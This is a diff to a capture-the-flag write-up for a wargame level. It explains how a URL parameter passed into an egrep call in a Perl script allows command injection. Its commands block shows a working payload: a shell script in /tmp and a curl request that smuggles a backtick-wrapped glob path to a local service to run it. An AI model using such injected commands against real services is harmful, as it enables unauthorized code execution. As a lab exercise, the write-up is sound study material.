@@ -8,14 +8,14 @@ In this level we have to:
 3. To see how to pass the params and how they are transformed, I've imported the code and print everything (see level12_cristina.pl)
 4. It is clear that we have to use the `egrep "^$xx" /tmp/xd` to exploit the code, since the variable `$xx` is coming directly from the parameter
 5. Now the big WTF moment, egrep executes the regex... it is very stupid... once this is discovered everything else is pretty easy....
-![The stupidest thing ever \o/](wtf.png)
+![The stupidest thing ever \o/](./Resources/wtf.png)
 
 
 ## 👾 Commands
 
 ```
 echo "getflag > /tmp/lol" > /tmp/LOL.SH
-chmod s+x /tmp/LOL.SH
+chmod +x /tmp/LOL.SH
 curl '127.0.0.1:4646?x="`/*/LOL.SH`"'
 cat /tmp/lol
 ```
